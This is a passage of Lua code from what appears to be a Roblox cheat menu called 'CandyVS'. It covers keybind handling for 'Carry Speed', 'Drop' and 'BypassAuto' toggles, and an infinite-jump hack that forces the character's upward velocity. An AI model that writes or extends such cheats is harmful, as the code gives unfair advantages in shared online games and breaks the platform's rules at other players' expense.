		pcall(function() if _G.__refreshSpeedBillboards then _G.__refreshSpeedBillboards() end end)
		saveConfig()
		return
	end
	if carryKeyMatches then
		if FeatureToggles["Carry Speed"] then
			FeatureToggles["Carry Speed"]()
		else
			local active = not toggleStates["Carry Speed"]
			toggleStates["Carry Speed"] = active
			speedToggled = active
			if FeaturePostToggle["Carry Speed"] then FeaturePostToggle["Carry Speed"](active) end
			if toggleVisualUpdaters["Carry Speed"] then toggleVisualUpdaters["Carry Speed"]() end
			saveConfig()
		end
		return
	end
	local dropKey = FeatureKeybinds["Drop"]
	local dropKeyMatches = dropKey ~= nil and (
	(isBindableInput(input) and input.KeyCode == dropKey)
	or (isMouseSideButton(input) and getMouseButtonBind(input) == dropKey)
	)
	if dropKeyMatches then
	if FeatureToggles["Drop"] then FeatureToggles["Drop"]("keybind") end
	return
	end
	if gameProcessed and not gamepadInputTypes[input.UserInputType] then return end

	if isBindableInput(input) then
	for feat, key in pairs(FeatureKeybinds) do
	if input.KeyCode == key then
	if FeatureToggles[feat] then
	if feat == "Drop" then FeatureToggles[feat]("keybind") else FeatureToggles[feat]() end
	else
	local active = not toggleStates[feat]
	toggleStates[feat] = active
	saveConfig()
	if FeaturePostToggle[feat] then FeaturePostToggle[feat](active) end
	if toggleVisualUpdaters[feat] then toggleVisualUpdaters[feat]() end
	end
	end
	end
	end

	if isMouseSideButton(input) then
	local mbBind = getMouseButtonBind(input)
	for feat, key in pairs(FeatureKeybinds) do
	if key == mbBind then
	if FeatureToggles[feat] then
	if feat == "Drop" then FeatureToggles[feat]("keybind") else FeatureToggles[feat]() end
	else
	local active = not toggleStates[feat]
	toggleStates[feat] = active
	saveConfig()
	if FeaturePostToggle[feat] then FeaturePostToggle[feat](active) end
	if toggleVisualUpdaters[feat] then toggleVisualUpdaters[feat]() end
	end
	end
	end
	end

	if not gameProcessed and not UserInputService:GetFocusedTextBox() then
	if isMouseSideButton(input) then
	local mb = getMouseButtonBind(input)
	if FeatureKeybinds["BypassAuto"] == mb then
	if FeatureToggles["BypassAuto"] then
	FeatureToggles["BypassAuto"]()
	end
	return
	end
	else
	local bk = FeatureKeybinds["BypassAuto"]
	if bk and input.KeyCode == bk then
	if FeatureToggles["BypassAuto"] then
	FeatureToggles["BypassAuto"]()
	end
	return
	end
	end
	end
	end

	_G.__CandyVSTrackConn(UserInputService.InputBegan:Connect(handleKeyInput))
	end)()

	;(function()
	local infJumpState = _G.__CandyVSInfJumpState or {}
	_G.__CandyVSInfJumpState = infJumpState
	infJumpState.conn = infJumpState.conn or nil
	infJumpState.lastJumpTime = infJumpState.lastJumpTime or 0
	infJumpState.manualLock = false
	local HOP_POWER = 55
	local HOP_COOLDOWN = 0.08

	local function isJumpBlocked()
	return false
	end

	local function triggerManualJump()
	if (_G.__CandyVSInfJumpMode or "hold") ~= "manual" or infJumpState.manualLock then return end
	infJumpState.manualLock = true
	local char = Player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then
	infJumpState.manualLock = false
	return
	end
	local now = tick()
	if (now - infJumpState.lastJumpTime) < HOP_COOLDOWN then
	infJumpState.manualLock = false
	return
	end
	infJumpState.lastJumpTime = now
	hrp.Velocity = Vector3.new(hrp.Velocity.X, HOP_POWER, hrp.Velocity.Z)
	task.delay(0.14, function() infJumpState.manualLock = false end)
	end

	_G.__CandyVSTrackConn(UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.ButtonA then
	if (_G.__CandyVSInfJumpMode or "hold") == "manual" then
	triggerManualJump()
	return
	end
	if not isJumpBlocked() then
	infJumpState.lastJumpTime = tick() - HOP_COOLDOWN
	end
	end
	end))

	function startInfJump()
	if infJumpState.conn then
	infJumpState.conn:Disconnect()
	infJumpState.conn = nil
	end
	infJumpState.conn = RunService.Heartbeat:Connect(function()
	if not toggleStates["Inf Jump"] or (_G.__CandyVSInfJumpMode or "hold") ~= "hold" then return end
	if isJumpBlocked() then return end
	pcall(function()
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local now = tick()
	local wantsToJump = UserInputService:IsKeyDown(Enum.KeyCode.Space) or UserInputService:IsKeyDown(Enum.KeyCode.ButtonA) or hum.Jump == true
	if wantsToJump and (now - infJumpState.lastJumpTime) >= HOP_COOLDOWN then
	infJumpState.lastJumpTime = now
	local velocity = hrp.Velocity
	hrp.Velocity = Vector3.new(velocity.X, HOP_POWER, velocity.Z)
	end
	end)
	end)
	end

function stopInfJump()
	if infJumpState.conn then
	infJumpState.conn:Disconnect()
	infJumpState.conn = nil
end
end
_G.__CandyVSTrackStopper(stopInfJump)
FeaturePostToggle["Inf Jump"] = function(active)
if active and (_G.__CandyVSInfJumpMode or "hold") == "hold" then
startInfJump()
else
stopInfJump()
end
end
if toggleStates["Inf Jump"] and (_G.__CandyVSInfJumpMode or "hold") == "hold" then startInfJump() end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function()
	if toggleStates["Inf Jump"] and (_G.__CandyVSInfJumpMode or "hold") == "hold" then
	task.wait(0.5)
	stopInfJump()
	startInfJump()
	end
	end))
	end)()
	ScreenGui.Enabled = true
	task.defer(function()
	for _, feature in ipairs({ "FPS Boost", "Anti Lag", "Optimizer" }) do
	if toggleStates[feature] and FeaturePostToggle[feature] then
	pcall(function() FeaturePostToggle[feature](true) end)
	end
	end
	end)

	end 
	end)() 
